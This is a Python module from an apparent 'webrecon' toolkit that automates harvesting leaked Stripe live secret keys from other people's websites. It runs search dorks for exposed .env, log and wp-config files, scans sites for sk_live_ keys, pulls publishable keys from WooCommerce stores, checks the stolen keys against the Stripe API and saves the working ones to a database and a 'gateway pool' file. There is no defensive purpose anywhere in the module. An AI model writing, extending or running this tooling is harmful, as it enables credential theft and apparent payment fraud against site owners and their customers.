"""Web hunter integration -- refactored from ``sk_web_hunter.py`` and ``site_scraper.py``.

This module replicates the functionality of the original
``sk_web_hunter.py`` and ``site_scraper.py`` scripts using the
``webrecon`` package:

1. Find target sites via Serper.dev.
2. Check common exposed-file paths for leaked ``sk_live_`` keys.
3. Validate WooCommerce Store API and extract ``pk_live_`` keys.
4. Validate keys via Stripe API.
5. Save results to the database (replaces ``gateway_pool.json``).

Original script interface preserved for backward compatibility.
"""

from __future__ import annotations

from typing import Any

from webrecon.core.models import (
    DiscoverySource,
    KeyType,
    StripeKey,
    WebsiteAsset,
)
from webrecon.log import get_logger

__all__ = ["run_web_hunter"]

_LOGGER = get_logger(__name__)

# Default Serper dorks for finding sites with exposed keys.
_HUNTER_DORKS: list[str] = [
    '"sk_live_" filetype:env',
    '"sk_live_" filetype:log',
    '"wp-config.php" "DB_PASSWORD" inurl:wp-config',
]


async def run_web_hunter(
    *,
    serper_key: str = "",
    target_urls: list[str] | None = None,
    scan_exposed: bool = True,
    validate_woo: bool = True,
    validate_keys: bool = True,
    save_to_db: bool = True,
    db_path: str = "webrecon.sqlite3",
    gateway_pool_path: str = "gateway_pool.json",
    concurrency: int = 15,
) -> dict[str, Any]:
    """Run the web hunter pipeline.

    This combines the functionality of ``sk_web_hunter.py`` (exposed
    file scanning for ``sk_live_`` keys) and ``site_scraper.py``
    (WooCommerce validation and ``pk_live_`` extraction).

    Args:
        serper_key: Serper.dev API key (for discovering targets).
        target_urls: Explicit list of URLs to scan (skips Serper
            discovery if provided).
        scan_exposed: Whether to scan for exposed files.
        validate_woo: Whether to validate WooCommerce.
        validate_keys: Whether to validate found Stripe keys.
        save_to_db: Whether to persist results to the database.
        db_path: Path to the SQLite database file.
        gateway_pool_path: Path to ``gateway_pool.json``.
        concurrency: HTTP concurrency limit.

    Returns:
        Dict with ``"assets"``, ``"sk_keys"``, and ``"scan_results"``.
    """
    import httpx

    from webrecon.automation.stripe_tester import StripeTester
    from webrecon.mass_parser.client import MassParserClient
    from webrecon.mass_parser.scanner import ExposedFileScanner, ScanResult
    from webrecon.mass_parser.woocommerce import WooCommerceValidator

    urls = target_urls or []

    # Step 1: Discover targets via Serper if no explicit URLs.
    if not urls and serper_key:
        from webrecon.discovery.serper import SerperClient
        async with httpx.AsyncClient() as http:
            serper = SerperClient(http, api_key=serper_key)
            for dork in _HUNTER_DORKS:
                async for asset in serper.search_to_assets(dork, max_pages=3):
                    urls.append(asset.url)

    if not urls:
        _LOGGER.warning("hunter_integration.no_targets")
        return {"assets": [], "sk_keys": [], "scan_results": []}

    # Deduplicate.
    urls = list(dict.fromkeys(urls))

    assets: list[WebsiteAsset] = []
    sk_keys: list[StripeKey] = []
    scan_results: list[ScanResult] = []

    async with MassParserClient(concurrency=concurrency) as http:
        # Step 2: Scan for exposed files.
        if scan_exposed:
            scanner = ExposedFileScanner(http)
            async for scan_result in scanner.scan_sites(urls):
                scan_results.append(scan_result)
                sk_keys.extend(scan_result.found_keys)
                _LOGGER.info(
                    "hunter_integration.exposed_found",
                    url=scan_result.url,
                    keys=len(scan_result.found_keys),
                    accessible=scan_result.accessible,
                )

        # Step 3: Validate WooCommerce.
        if validate_woo:
            validator = WooCommerceValidator(http, test_tokenization=False)
            for url in urls:
                woo_result = await validator.validate(
                    url,
                    discovery_source=DiscoverySource.MANUAL,
                )
                if woo_result.asset:
                    assets.append(woo_result.asset)

        # Step 4: Validate Stripe keys.
        if validate_keys and sk_keys:
            tester = StripeTester(http)
            for i, key in enumerate(sk_keys):
                if key.key_type == KeyType.SK_LIVE:
                    sk_result = await tester.validate_sk(
                        key.key_value, stripe_key_model=key
                    )
                    if sk_result.stripe_key is not None:
                        sk_keys[i] = sk_result.stripe_key
                    _LOGGER.info(
                        "hunter_integration.key_validated",
                        key_prefix=key.key_value[:8],
                        is_valid=sk_result.is_valid,
                    )

    # Step 5: Save to database.
    if save_to_db:
        from webrecon.database import StripeKeyRepository, WebsiteAssetRepository, open_database
        pool = await open_database(db_path)

        if assets:
            asset_repo = WebsiteAssetRepository(pool)
            for asset in assets:
                try:
                    await asset_repo.upsert(asset)
                except Exception as exc:
                    _LOGGER.warning("hunter_integration.asset_db_error", error=str(exc))

        if sk_keys:
            key_repo = StripeKeyRepository(pool)
            for key in sk_keys:
                try:
                    await key_repo.upsert(key)
                except Exception as exc:
                    _LOGGER.warning("hunter_integration.key_db_error", error=str(exc))

        await pool.close()

    # Step 6: Write gateway_pool.json.
    if gateway_pool_path:
        from webrecon.integration.fofa_integration import _write_gateway_pool
        _write_gateway_pool(assets, gateway_pool_path)

    _LOGGER.info(
        "hunter_integration.complete",
        targets=len(urls),
        assets=len(assets),
        sk_keys=len(sk_keys),
        exposed=len(scan_results),
    )

    return {
        "assets": assets,
        "sk_keys": sk_keys,
        "scan_results": scan_results,
    }
